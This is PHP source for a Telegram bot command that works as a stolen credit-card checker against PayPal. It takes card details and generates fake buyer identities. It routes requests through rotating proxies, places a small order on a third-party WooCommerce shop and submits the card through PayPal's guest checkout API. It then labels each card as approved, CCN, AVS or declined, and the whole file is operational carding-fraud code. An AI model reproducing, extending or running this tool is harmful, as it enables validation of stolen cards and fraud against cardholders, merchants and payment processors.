<?php
require_once __DIR__ . '/../common.php';

$cmd = Command($message);
if (strtolower($cmd['command']) == "pp") { 
    

$lista = $cmd['data'];


sendaction($chatId, typing);
is_registerv();
$NameGater ='Paypal';
$gateway = '/pp :'.$NameGater;
is_gateroff($NameGater); //off Gater

is_freeuser(); 
deleteprm($userId); 
Contador($gateway);

IS_BANNED($userId,$chatId,$message_id);
sendaction($chatId, typing);

deleteprm($userId);

if(empty($lista)) $lista = $r_msg;
if(empty($lista)) $lista = $q_msg;

if(empty($lista)){
bot('sendMessage', [
                'chat_id' =>$chatId,
                'disable_web_page_preview' => true,
    'reply_to_message_id'=>$message_id,
    'parse_mode'=>'HTML',
                'text' =>"<b>[<a href='https://t.me/ritabotchk/35'>ϟ</a>] Gate Charged: >_ $-Security System ⚠️
━━━━━━━━━━━━━━━━
[<a href='https://t.me/ritabotchk/35'>ϟ</a>] Gateway: <code>$NameGater</code>
[<a href='https://t.me/ritabotchk/35'>ϟ</a>] Pasarela: <code>Paypal 0.10$</code>
[<a href='https://t.me/ritabotchk/35'>ϟ</a>] Status: <code>ONLINE! 🟩</code>
[<a href='https://t.me/ritabotchk/35'>ϟ</a>] Format: <code>!pp card|month|year|cvv</code>
━━━━━━━━━━━━━━━━</b>"
                ]);
        die();
}

$tiempo_inicial = microtime(true);

$card = json_encode(Parser1($lista));
$card = json_decode($card, true);
$cc = $card["card"];
$mes = $card["MES"];
$ano = $card["ANO"];
$cvv = $card["CVV"];
$valid = $card["valid"];


if($valid == "ERROR"){
reply_to($chatId,$message_id,$keyboard,"<b>Invalid format</b>");
die();
}

if(bannedbin(substr($cc, 0,6)) == true){
reply_to($chatId,$message_id,$keyboard,"<b>Bin Banned</b>.");
exit();
}

if ($gId == $Mi_Id) $Rank = "Owner";
elseif (verifiAdmin($userId)) $Rank = "Admin";
elseif (veritimepremium($userId)) $Rank = infouser($userId)['apodo'];
elseif (verifiCharAdmin($chatId)) $Rank = "Free User";
elseif (verifiUser($userId)) $Rank = "Free user";

is_Antispma($userId, $chatId, $messageId, $keyboard);
    
    
$res = bininfo(substr($cc, 0,6));
$type = $res['type'];
$bank = $res['bank'];
$brand = $res['brand'];
$scheme = $res['level'];
$country = $res['country'];
$emoji = $res['Emoji'];

if($scheme == 'PREPAID'){
reply_to($chatId,$message_id,$keyboard,"<b>Bin PREPAID Banned</b>.");
die();
}

$messageidtoedit1 = bot('sendMessage', [
    'chat_id' =>$chatId,
    'disable_web_page_preview' => true,
'reply_to_message_id'=>$message_id,
'parse_mode'=>'HTML',
    'text' =>"<b>[<a href='https://t.me/ritabotchk/35'>ϟ</a>] Gate Charged: >_ $-Paypal 0.10$
━━━━━━━━━━━━━━━━
[<a href='https://t.me/ritabotchk/35'>ϟ</a>] Status: <code>WAIT A FEW SECONDS 🟥</code>
[<a href='https://t.me/ritabotchk/35'>ϟ</a>] Gateway: <code>$NameGater</code>
[<a href='https://t.me/ritabotchk/35'>ϟ</a>] Card: <code>$cc|$mes|$ano|$cvv</code> 
━━━━━━━━━━━━━━━━
[<a href='https://t.me/ritabotchk/35'>ϟ</a>] Country: <code>$country - $emoji</code>
[<a href='https://t.me/ritabotchk/35'>ϟ</a>] Type: <code>$type - $brand - $scheme</code>
[<a href='https://t.me/ritabotchk/35'>ϟ</a>] Bank: <code>$bank</code> 
━━━━━━━━━━━━━━━━
[<a href='https://t.me/ritabotchk/35'>ϟ</a>] Checked by: <a href='tg://user?id=$userId'>$username</a>[<code>$Rank</code>]
━━━━━━━━━━━━━━━━</b>"
]);

$messageidtoedit = capture(json_encode($messageidtoedit1), '"message_id":', ',');

antisppre($userId); //Premium
antispFree($userId); //Free User

if(strlen($ano) == 2){
    $ano = '20'.$ano;
}

$curl = new CurlX;
$cookie = uniqid();


$retries = 0;
$maxRetries = 3;


if(strlen($ano) == 2){
    $ano = '20'.$ano;
}

$json = file_get_contents("https://randomuser.me/api/?nat=us");
$data = json_decode($json, true);
$user = $data["results"][0];
$providers = array('gmail.com', 'hotmail.com', 'yahoo.com', 'outlook.com');
$provider = $providers[array_rand($providers)];
$email = strtolower($user["name"]["first"]) . '.' . strtolower($user["name"]["last"]) . '@' . $provider;
$firstname = $user["name"]["first"];
$lastname = $user["name"]["last"];
$street = $user["location"]["street"]["name"] . ' ' . $user["location"]["street"]["number"];
$state = $user["location"]["state"];
$city = $user["location"]["city"];
$phone = $user["phone"];
$zip = $user["location"]["postcode"];

$password = substr(str_shuffle('abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'), 0, 14);

$socks5 = socks5();
$rotate = rotate(); 



$server = ["METHOD" => "CUSTOM", "SERVER" => $socks5, "AUTH" => $rotate];


while ($retries < $maxRetries) {
    try {

        $req2 = $curl::Post('https://sourcing.cn.com/wp-admin/admin-ajax.php',
        $data = 'attribute_colour=Baby+white+%5Bbuilt-in+battery%5D&quantity=1&add-to-cart=16641&product_id=16641&variation_id=16656&action=woodmart_ajax_add_to_cart',
        $headers = [
            'accept: */*',
            'accept-language: es-ES,es;q=0.9',
            'content-type: application/x-www-form-urlencoded; charset=UTF-8',
            'origin: https://sourcing.cn.com',
            'priority: u=1, i',
            'referer: https://sourcing.cn.com/product/2023-new-folding-small-fan-portable-creative-neck-mini-fan-handheld-usb-small-fan-charging-model/',
            'sec-ch-ua: "Not/A)Brand";v="8", "Chromium";v="126", "Google Chrome";v="126"',
            'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36',
            'x-requested-with: XMLHttpRequest'],
            $cookie, $server);
            if (!$req2->code) {
            throw new Exception("Error en la conexión REQ1");
        }

        $req1 = $curl::Get('https://sourcing.cn.com/checkout/', $headers = 
    [
        'accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36'], $cookie, $server);
        if (!$req1->code) {
        throw new Exception("Error en la conexión REQ2");
    }
    $nonce = $curl::ParseString($req1->body, 'wc-ajax=ppc-create-order","nonce":"', '"');
    $nonce2 = $curl::ParseString($req1->body, '<input type="hidden" id="woocommerce-process-checkout-nonce" name="woocommerce-process-checkout-nonce" value="', '"');

    $req2 = $curl::Post('https://sourcing.cn.com/?wc-ajax=ppc-create-order',
    $data = '{"nonce":"'.$nonce.'","payer":null,"bn_code":"Woo_PPCP","context":"checkout","order_id":"0","payment_method":"ppcp-gateway","funding_source":"card","form_encoded":"billing_first_name='.$firstname.'&billing_last_name='.$lastname.'&billing_company=Corp+'.$lastname.'&billing_country=US&billing_address_1=420+Capitol+Way+S&billing_address_2=&billing_city=Olympia&billing_state=WA&billing_postcode='.$zip.'&billing_phone='.urlencode($phone).'&billing_email='.urlencode($email).'&order_comments=&payment_method=ppcp-gateway&mailpoet_woocommerce_checkout_optin=1&mailpoet_woocommerce_checkout_optin_present=1&woocommerce-process-checkout-nonce='.$nonce2.'&_wp_http_referer=%2F%3Fwc-ajax%3Dupdate_order_review&ppcp-funding-source=card","createaccount":false,"save_payment_method":false}',
    $headers = [
        'accept: */*',
'accept-language: es-ES,es;q=0.9',
'content-type: application/json',
'origin: https://sourcing.cn.com',
'priority: u=1, i',
'referer: https://sourcing.cn.com/checkout/',
'sec-ch-ua: "Not/A)Brand";v="8", "Chromium";v="126", "Google Chrome";v="126"',
'sec-ch-ua-mobile: ?0',
'sec-ch-ua-platform: "Windows"',
'sec-fetch-dest: empty',
'sec-fetch-mode: cors',
'sec-fetch-site: same-origin',
'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36',],
        $cookie, $server);
        if (!$req2->code) {
        throw new Exception("Error en la conexión REQ1");
    }
    $id = json_decode($req2->body, true)['data']['id'];



        $option =  ["5"=>"MASTER_CARD","6"=> "DISCOVER", "4"=>"VISA","3"=> "AMEX", "34"=>"DINERS"];
        $type = $option[substr($cc ,0,1)];


        $req2 = $curl::Post('https://www.paypal.com/graphql?fetch_credit_form_submit',
        $data = '{"query":"\n        mutation payWithCard(\n            $token: String!\n            $card: CardInput!\n            $phoneNumber: String\n            $firstName: String\n            $lastName: String\n            $shippingAddress: AddressInput\n            $billingAddress: AddressInput\n            $email: String\n            $currencyConversionType: CheckoutCurrencyConversionType\n            $installmentTerm: Int\n            $identityDocument: IdentityDocumentInput\n        ) {\n            approveGuestPaymentWithCreditCard(\n                token: $token\n                card: $card\n                phoneNumber: $phoneNumber\n                firstName: $firstName\n                lastName: $lastName\n                email: $email\n                shippingAddress: $shippingAddress\n                billingAddress: $billingAddress\n                currencyConversionType: $currencyConversionType\n                installmentTerm: $installmentTerm\n                identityDocument: $identityDocument\n            ) {\n                flags {\n                    is3DSecureRequired\n                }\n                cart {\n                    intent\n                    cartId\n                    buyer {\n                        userId\n                        auth {\n                            accessToken\n                        }\n                    }\n                    returnUrl {\n                        href\n                    }\n                }\n                paymentContingencies {\n                    threeDomainSecure {\n                        status\n                        method\n                        redirectUrl {\n                            href\n                        }\n                        parameter\n                    }\n                }\n            }\n        }\n        ","variables":{"token":"'.$id.'","card":{"cardNumber":"'.$cc.'","type":"'.$type.'","expirationDate":"'.$mes.'/'.$ano.'","postalCode":"'.$zip.'","securityCode":"'.$cvv.'"},"firstName":"'.$firstname.'","lastName":"'.$lastname.'","billingAddress":{"givenName":"'.$firstname.'","familyName":"'.$lastname.'","line1":"'.$street.'","line2":null,"city":"Olympia","state":"WA","postalCode":"'.$zip.'","country":"US"},"email":"'.$email.'","currencyConversionType":"PAYPAL"},"operationName":null}',
        $headers = [
'accept: */*',
'accept-language: es-ES,es;q=0.9',
'content-type: application/json',
'origin: https://www.paypal.com',
'paypal-client-context: '.$id.'',
'paypal-client-metadata-id: '.$id.'',
'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36',
'x-app-name: standardcardfields',
'x-country: US',
],
$cookie, null);
if (!$req2->code) {
    throw new Exception("Error en la conexión REQ5");
}
$error = json_decode($req2->body, true)['errors'][0]['data'][0]['code'];
if (!$error) {
            throw new Exception("Error en bearer");
}
        break; 

    } catch (Exception $e) {
        $retries++;
        if ($retries >= $maxRetries) {
 $text = Textretries();
    bot('editMessageText', ['chat_id'=>$chatId, 'message_id'=>$messageidtoedit, 'text'=>$text, 'parse_mode'=>'html', 'reply_to_message_id'=> $message_id]);
    return;
        }
    }
}
$tiempo_final = microtime(true);
$tiempo = $tiempo_final - $tiempo_inicial;
$tiempo = substr($tiempo, 0, 4);
if(strlen($mes) == 1){
    $mes = '0'.$mes;
}

bot('editMessageText',[
    'chat_id'=>$chatId,
    'disable_web_page_preview' => true,
    'message_id'=>$messageidtoedit,
    'text'=>"<b>[<a href='https://t.me/ritabotchk/35'>ϟ</a>] Gate Charged: >_ $-Paypal 0.10$
━━━━━━━━━━━━━━━━
[<a href='https://t.me/ritabotchk/35'>ϟ</a>] Status: <code>ALMOST FINISHED 🟩</code>
[<a href='https://t.me/ritabotchk/35'>ϟ</a>] Gateway: <code>$NameGater</code>
[<a href='https://t.me/ritabotchk/35'>ϟ</a>] Card: <code>$cc|$mes|$ano|$cvv</code> 
━━━━━━━━━━━━━━━━
[<a href='https://t.me/ritabotchk/35'>ϟ</a>] Country: <code>$country - $emoji</code>
[<a href='https://t.me/ritabotchk/35'>ϟ</a>] Type: <code>$type - $brand - $scheme</code>
[<a href='https://t.me/ritabotchk/35'>ϟ</a>] Bank: <code>$bank</code> 
━━━━━━━━━━━━━━━━
[<a href='https://t.me/ritabotchk/35'>ϟ</a>] Checked by: <a href='tg://user?id=$userId'>$username</a>[<code>$Rank</code>]
━━━━━━━━━━━━━━━━</b>",
'parse_mode'=>'html',
'reply_to_message_id'=> $message_id]);


if (strpos($req2->body, 'is3DSecureRequired') !== false) {
    $status = 'APPROVED✅';
    $response = 'Charged $0.10✅';
} elseif ($error == 'INVALID_SECURITY_CODE') {
    $status = 'CCN✅';
    $response = $error;
} elseif ($error == 'INVALID_BILLING_ADDRESS') {
    $status = 'AVS✅';
    $response = $error;
} elseif ($error == 'EXISTING_ACCOUNT_RESTRICTED') {
    $status = 'APPROVED✅';
    $response = $error;
} else {
    $status = 'DECLINED❌';
    $response = $error;
}

bot('editMessageText',[
    'chat_id'=>$chatId,
    'disable_web_page_preview' => true,
    'message_id'=>$messageidtoedit,
    'text'=>"<b>[<a href='https://t.me/ritabotchk/35'>ϟ</a>] Gate Charged: >_ $-Paypal 0.10$
━━━━━━━━━━━━━━━━
[<a href='https://t.me/ritabotchk/35'>ϟ</a>] Card: <code>$cc|$mes|$ano|$cvv</code> 
[<a href='https://t.me/ritabotchk/35'>ϟ</a>] Status: <code>$status</code>
[<a href='https://t.me/ritabotchk/35'>ϟ</a>] Response: <code>$response</code>
━━━━━━━━━━━━━━━━
[<a href='https://t.me/ritabotchk/35'>ϟ</a>] Country: <code>$country - $emoji</code>
[<a href='https://t.me/ritabotchk/35'>ϟ</a>] Type: <code>$type - $brand - $scheme</code>
[<a href='https://t.me/ritabotchk/35'>ϟ</a>] Bank: <code>$bank</code> 
━━━━━━━━━━━━━━━━
[<a href='https://t.me/ritabotchk/35'>ϟ</a>] Card Check info: Proxy's: <code>Live ✅</code> 
[<a href='https://t.me/ritabotchk/35'>ϟ</a>] Time: <code>$tiempo</code> | Gate: <code>$NameGater</code>
[<a href='https://t.me/ritabotchk/35'>ϟ</a>] Checked by: <a href='tg://user?id=$userId'>$username</a>[<code>$Rank</code>]
━━━━━━━━━━━━━━━━</b>",
'parse_mode'=>'html',
'reply_to_message_id'=> $message_id]);

}

?>

